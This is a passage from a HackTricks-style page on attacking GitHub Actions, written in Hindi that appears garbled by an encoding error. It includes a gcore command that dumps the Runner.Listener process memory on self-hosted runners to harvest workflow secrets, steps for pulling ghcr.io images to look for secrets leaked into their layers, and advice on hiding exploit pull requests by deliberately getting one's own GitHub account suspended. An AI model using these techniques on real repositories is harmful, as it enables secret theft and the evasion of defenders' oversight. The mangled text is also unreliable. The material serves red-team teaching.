рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдХрд┐ рдХреМрди рд╕реА **Github Actions рдЧреИрд░-github рдЕрд╡рд╕рдВрд░рдЪрдирд╛ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рд░рд╣реА рд╣реИрдВ** рд╡рд╣ рд╣реИ рдХрд┐ Github Action рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди yaml рдореЗрдВ **`runs-on: self-hosted`** рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдВред

**рд╕реНрд╡рдпрдВ-рд╣реЛрд╕реНрдЯреЗрдб** рд░рдирд░реНрд╕ рдХреЛ **рдЕрддрд┐рд░рд┐рдХреНрдд рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдЕрдиреНрдп **рдиреЗрдЯрд╡рд░реНрдХ рд╕рд┐рд╕реНрдЯрдо** (рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдХрдордЬреЛрд░ рдПрдВрдбрдкреЙрдЗрдВрдЯ? рдореЗрдЯрд╛рдбреЗрдЯрд╛ рд╕реЗрд╡рд╛?) рдпрд╛, рднрд▓реЗ рд╣реА рдпрд╣ рдЕрд▓рдЧ-рдерд▓рдЧ рдФрд░ рдирд╖реНрдЯ рд╣реЛ рдЬрд╛рдП, **рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдХреНрд░рд┐рдпрд╛рдПрдВ рдПрдХ рд╣реА рд╕рдордп рдореЗрдВ рдЪрд▓рд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ** рдФрд░ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдПрдХ **рджреВрд╕рд░реЗ рдХреЗ рдЧреБрдкреНрдд рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреА рд╣реИ**ред

рд╕реНрд╡рдпрдВ-рд╣реЛрд╕реНрдЯреЗрдб рд░рдирд░реНрд╕ рдореЗрдВ рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **\_Runner.Listener**\_\*\* рдкреНрд░рдХреНрд░рд┐рдпрд╛\*\* рд╕реЗ **рдЧреБрдкреНрдд рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ** рдЬреЛ рдХрд┐рд╕реА рднреА рдЪрд░рдг рдореЗрдВ рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдХреЗ рд╕рднреА рдЧреБрдкреНрдд рдХреЛ рдЕрдкрдиреА рдореЗрдореЛрд░реА рдХреЛ рдбрдВрдк рдХрд░рдХреЗ рд░рдЦреЗрдЧрд╛:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

рдЪреЗрдХ рдХрд░реЗрдВ [**рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/)ред

### Github Docker Images Registry

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ Github actions рдмрдирд╛рдИ рдЬрд╛рдПрдВ рдЬреЛ **Github рдХреЗ рдЕрдВрджрд░ рдПрдХ Docker рдЗрдореЗрдЬ рдмрдирд╛рдПрдБ рдФрд░ рд╕реНрдЯреЛрд░ рдХрд░реЗрдВ**ред\
рдПрдХ рдЙрджрд╛рд╣рд░рдг рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡рд┐рд╕реНрддрд╛рд░ рдпреЛрдЧреНрдп рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдкрд┐рдЫрд▓реЗ рдХреЛрдб рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, Github рд░рдЬрд┐рд╕реНрдЯреНрд░реА **`ghcr.io`** рдкрд░ рд╣реЛрд╕реНрдЯ рдХреА рдЧрдИ рд╣реИред

рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬрд┐рд╕реЗ рд░реЗрдкреЛ рдкрд░ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ рдлрд┐рд░ рдПрдХ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Docker рдЗрдореЗрдЬ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХреЗрдЧрд╛:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
рдлрд┐рд░, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **Docker рдЫрд╡рд┐ рдкрд░рддреЛрдВ рдореЗрдВ рд▓реАрдХ рд╣реБрдП рд░рд╣рд╕реНрдпреЛрдВ** рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actions рд▓реЙрдЧ рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА

рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЕрдЧрд░ **Github** **рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рд▓реЙрдЧ рдореЗрдВ рд░рд╣рд╕реНрдпрдордп рдорд╛рдиреЛрдВ** рдХрд╛ **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ** рдФрд░ **рдЙрдиреНрд╣реЗрдВ рджрд┐рдЦрд╛рдиреЗ рд╕реЗ рдмрдЪрдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ, рддреЛ **рдЕрдиреНрдп рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛** рдЬреЛ рдХреНрд░рд┐рдпрд╛ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдореЗрдВ рдЙрддреНрдкрдиреНрди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЫрд┐рдкрд╛ рдирд╣реАрдВ рд╣реЛрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ JWT рдЬреЛ рдПрдХ рд░рд╣рд╕реНрдпрдордп рдорд╛рди рдХреЗ рд╕рд╛рде рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реИ, рддрдм рддрдХ рдЫрд┐рдкрд╛ рдирд╣реАрдВ рд╣реЛрдЧрд╛ рдЬрдм рддрдХ рдХрд┐ рдЗрд╕реЗ [рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред

## рдЕрдкрдиреЗ рдирд┐рд╢рд╛рди рдЫрд┐рдкрд╛рдирд╛

(рддрдХрдиреАрдХ [**рдпрд╣рд╛рдВ**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit) рд╕реЗ) рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдХреЛрдИ рднреА PR рдЬреЛ рдЙрдард╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╡рд╣ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ Github рдореЗрдВ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдФрд░ рд▓рдХреНрд╖рд┐рдд GitHub рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИред GitHub рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рд╣рдо **рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдПрдХ PR рдХреЛ рд╣рдЯрд╛ рдирд╣реАрдВ рд╕рдХрддреЗ**, рд▓реЗрдХрд┐рди рдЗрд╕рдореЗрдВ рдПрдХ рдореЛрдбрд╝ рд╣реИред рдЙрди GitHub рдЦрд╛рддреЛрдВ рдХреЗ рд▓рд┐рдП рдЬреЛ **Github рджреНрд╡рд╛рд░рд╛ рдирд┐рд▓рдВрдмрд┐рдд** рд╣реИрдВ, рдЙрдирдХреЗ рд╕рднреА **PR рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╣рдЯрд╛ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ** рдФрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рд╣рдЯрд╛ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП рдЕрдкрдиреА рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рдЫрд┐рдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдпрд╛ рддреЛ рдЕрдкрдиреЗ **GitHub рдЦрд╛рддреЗ рдХреЛ рдирд┐рд▓рдВрдмрд┐рдд** рдХрд░рд╛рдирд╛ рд╣реЛрдЧрд╛ рдпрд╛ рдЕрдкрдиреЗ рдЦрд╛рддреЗ рдХреЛ **рдлреНрд▓реИрдЧ** рдХрд░рд╛рдирд╛ рд╣реЛрдЧрд╛ред рдпрд╣ **рдЖрдкрдХреА рд╕рднреА рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ** рдХреЛ GitHub рд╕реЗ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдЫрд┐рдкрд╛ рджреЗрдЧрд╛ (рдмреБрдирд┐рдпрд╛рджреА рд░реВрдк рд╕реЗ рдЖрдкрдХреЗ рд╕рднреА рд╢реЛрд╖рдг PR рдХреЛ рд╣рдЯрд╛ рджреЗрдЧрд╛)

GitHub рдореЗрдВ рдПрдХ рд╕рдВрдЧрдарди рдЦрд╛рддреЛрдВ рдХреА рд░рд┐рдкреЛрд░реНрдЯ рдХрд░рдиреЗ рдореЗрдВ рдмрд╣реБрдд рд╕рдХреНрд░рд┐рдп рд╣реИред рдЖрдкрдХреЛ рдмрд╕ "рдХреБрдЫ рдЪреАрдЬреЗрдВ" Issue рдореЗрдВ рд╕рд╛рдЭрд╛ рдХрд░рдиреА рд╣реИрдВ рдФрд░ рд╡реЗ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВрдЧреЗ рдХрд┐ рдЖрдкрдХрд╛ рдЦрд╛рддрд╛ 12 рдШрдВрдЯреЗ рдореЗрдВ рдирд┐рд▓рдВрдмрд┐рдд рд╣реЛ рдЬрд╛рдП :p рдФрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╣реИ, рдЕрдкрдиреЗ рд╢реЛрд╖рдг рдХреЛ github рдкрд░ рдЕрджреГрд╢реНрдп рдмрдирд╛ рджрд┐рдпрд╛ред

{% hint style="warning" %}
рдПрдХ рд╕рдВрдЧрдарди рдХреЗ рд▓рд┐рдП рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдПрдХрдорд╛рддреНрд░ рддрд░реАрдХрд╛ рд╣реИ рдХрд┐ рдЙрдиреНрд╣реЗрдВ рд▓рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, SIEM рд╕реЗ GitHub рд▓реЙрдЧ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ GitHub UI рд╕реЗ PR рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
{% endhint %}

## рдЙрдкрдХрд░рдг

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрдкрдХрд░рдг GitHub Action рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдЦреЛрдЬрдиреЗ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдХрдордЬреЛрд░ рд▓реЛрдЧреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИрдВ:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
{% endhint %}
